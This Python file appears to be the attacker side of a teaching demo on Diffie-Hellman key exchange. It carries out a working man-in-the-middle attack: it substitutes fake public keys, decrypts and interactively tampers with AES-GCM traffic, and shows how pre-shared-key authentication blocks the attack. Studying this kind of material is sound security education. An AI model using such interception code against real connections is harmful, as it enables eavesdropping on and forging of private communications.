# attacker.py
import socket, threading, os, queue
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from crypto_utils import generate_keypair, compute_shared_secret, derive_aes_key
from network_utils import recv_exact, recv_frame, send_frame

server_host, server_port = "192.168.1.20", 50000

mitm_host, mitm_port = "192.168.1.30", 50000

true_PSK = b"my-super-secret-preshared-key-32bytes!!"
false_PSK = b"xxxx"
use_psk = 0

event_queue = queue.Queue() # Store all interception events sent by threads
reply_map = {} # store the tampered results sent back to a specific thread {thread_id: tampered results}

print_lock = threading.RLock()

def log(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs, flush=True)

# safely close socket, ignore if already closed
def safe_shutdown(sock):
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        # socket is already closed or cannot shutdown
        pass
    try:
        sock.close()
    except OSError:
        pass

def console_manager():
    log("[Console] Manager started. Waiting for intercepted messages...")
    while True:
        # get an interception event
        event = event_queue.get()
        direction = event['direction']
        plaintext = event['plaintext']
        reply_queue = event['reply_queue']
        
        with print_lock:
            # print detailed context information
            print("="*50)
            print(f"[*] Direction: {direction}")
            print(f"[*] Original Content: {plaintext.decode(errors='replace')}")
            print("-" * 50)

            # input() tampered message
            tampered_text = input(f"Enter modified message (Press Enter to keep original): ")
        
            # send the result back to the thread
            if tampered_text:
                reply_queue.put(tampered_text.encode('utf-8'))
                print(f"[ACTION] tampered and forwarded")
            else:
                reply_queue.put(plaintext)
                print(f"[ACTION] forwarded as is")
            
            print("="*50)

# Thread: receive source data -> decrypt -> print and  tamper -> reencrypt -> send to destination
def handle_one_direction(source_conn, source_addr, source_aes, dest_conn, dest_addr, dest_aes):
    my_reply_queue = queue.Queue()
    
    try:
        while True:
            # receive from source
            blob = recv_frame(source_conn)
            nonce, ct = blob[:12], blob[12:]
            
            # decrypt with the shared key with the source
            plaintext = source_aes.decrypt(nonce, ct, None)

            # tamper with the msg
            event = {
                'direction': f'{source_addr} -> {dest_addr}',
                'plaintext': plaintext,
                'reply_queue': my_reply_queue
            }
            event_queue.put(event) # Encapsulate the event and send it to Manager
            new_plaintext = my_reply_queue.get() # Block waiting for Manager's tampered result

            # reencrypt with the shared with the destination
            new_nonce = os.urandom(12)
            new_ct = dest_aes.encrypt(new_nonce, new_plaintext, None)
            send_frame(dest_conn, new_nonce + new_ct)
            
    except (ConnectionError, OSError):
        log(f"[MITM] {source_addr} to {dest_addr} direction closed")
    except Exception as e:
        log(f"[MITM] Error occurred: {e} ({source_addr} to {dest_addr})")
    
    # close the socket
    safe_shutdown(source_conn)
    safe_shutdown(dest_conn)
    
def handle_MITM(client_conn, client_addr, server_conn):
    try:
        # 1. generate fake keypair for client and server respectively        
        fake_for_client_priv, fake_for_client_pub_bytes = generate_keypair() # fake keypair for client
        fake_for_server_priv, fake_for_server_pub_bytes = generate_keypair() # fake keypair for server

        # 2. intercept and hijack public keys during the handshake phase     
        real_server_pub_bytes = recv_frame(server_conn) # [connect (a)-server] receive public key from server
        send_frame(client_conn, fake_for_client_pub_bytes) # [connect (a)-client] send fake public key to client
              
        real_client_pub_bytes = recv_frame(client_conn) # [connect (b)-client] receive public key from client    
        send_frame(server_conn, fake_for_server_pub_bytes) # [connect (b)-server] send fake public key to server

        # 3. compute two shared secrets
        shared_client = compute_shared_secret(fake_for_client_priv, real_client_pub_bytes) # shared key with client 
        shared_server = compute_shared_secret(fake_for_server_priv, real_server_pub_bytes)  # shared key with server
                
        # 4. salt transmit (generated from Server and intercepted + recorded by attacker)
        salt = recv_frame(server_conn) # [connect (c)-server] receive salt from server
        send_frame(client_conn, salt) # [connect (c)-client] send salt to client
        
        if use_psk:
            # 5. authenticate with server
            from crypto_utils import verify_psk_auth_tag, compute_psk_auth_tag
            current_PSK = true_PSK if 2 == use_psk else false_PSK
            
            # 5-1 receive from server and verify server tag
            server_tag_recv = recv_frame(server_conn) # [connect (d)-server] receive tag from server
            
            # 5-2 compute and send fake client tag to server
            server_tag_send = compute_psk_auth_tag(current_PSK, salt, "CLIENT", fake_for_server_pub_bytes, real_server_pub_bytes, shared_server)
            send_frame(server_conn, server_tag_send) # [connect (e)-server] send computed tag to server
            
            # 6. authenticate with client
            # 6-1 compute and send fake server tag to client          
            client_tag_send = compute_psk_auth_tag(current_PSK, salt, "SERVER", fake_for_client_pub_bytes, real_client_pub_bytes, shared_client)
            send_frame(client_conn, client_tag_send) # [connect (d)-client] send tag to client
            
            # 6-2 receive from client and verify client tag
            client_tag_recv = recv_frame(client_conn) # [connect (e)-client] receive tag from client

        # 7. generate two AES keys
        key_client = derive_aes_key(shared_client, salt)
        aes_client = AESGCM(key_client)
        log(f"[MITM] derived shared key with client: {key_client} (length: {len(key_client)})")
        
        key_server = derive_aes_key(shared_server, salt)
        aes_server = AESGCM(key_server)
        log(f"[MITM] derived shared key with server: {key_server} (length: {len(key_server)})")

        log("[MITM] Handshake hijacked. Both keys established.")

        # 8. start bidirectional transparent forwarding
        
        # client to server direction
        t1 = threading.Thread(target=handle_one_direction, 
                    args=(client_conn, client_addr, aes_client, server_conn, f"('{server_host}', {server_port})" , aes_server))
                    
        # server to client direction
        t2 = threading.Thread(target=handle_one_direction, 
                    args=(server_conn, f"('{server_host}', {server_port})" , aes_server, client_conn, client_addr, aes_client))
        
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    except Exception as e:
        log(f"[MITM] Main Loop Error: {e}")
    finally:
        log(f"[MITM] keep listenning on {mitm_host}:{mitm_port}...")

def main():
    global use_psk
    
    print("=" * 50)
    print("Diffie-Hellman Key Exchange Demo (Attacker)")
    print("=" * 50)
    choice = input("Enable PSK authentication mode? (y/n, default=n): ").lower()
    use_psk = 1 if (choice in ['y', 'yes']) else 0
    
    if use_psk:
        print("PSK mode is turned on!")
        choice = input("Enable attacker acquire true PSK? (y/n, default=n): ").lower()
            
        if (choice in ['y', 'yes']):
            use_psk = 2
            print("Attacker can acquire true PSK!")
        else:
            use_psk = 1
            print("Attacker can NOT acquire true PSK!")
    else:
        print("PSK mode is turned off!")
        
    print("=" * 50)
    
    console_thread = threading.Thread(target=console_manager, daemon=True)
    console_thread.start()
    
    # prepare (a): start listening like a server
    lsp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsp.bind((mitm_host, mitm_port))
    lsp.listen(1)
    log(f"[MITM] listening on port {mitm_host}:{mitm_port}...")
    
    try:
	    while(True):
		    # a new client connects to attacker
		    client_conn, client_addr = lsp.accept()
		    log(f"[MITM] new target caught! Client: {client_addr}")

		    # prepare (b): connect to true server once connected with a new client
		    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    server_conn.connect((server_host, server_port))
		    local_addr = server_conn.getsockname()
		    log(f"[MITM] connected to real Server at {server_host}: {server_port} from attacker's local port {local_addr[1]}")
		    
		    # create a new thread to handle each new client
		    client_thread = threading.Thread(target=handle_MITM, args=(client_conn, client_addr, server_conn))
		    client_thread.start()
    except Exception as e:
	    log(f"[MITM] error occured: {e}")

if __name__ == "__main__":
    print(f"attacker: {mitm_host}:{mitm_port}")
    print(f"target server: {server_host}:{server_port}")
    main()

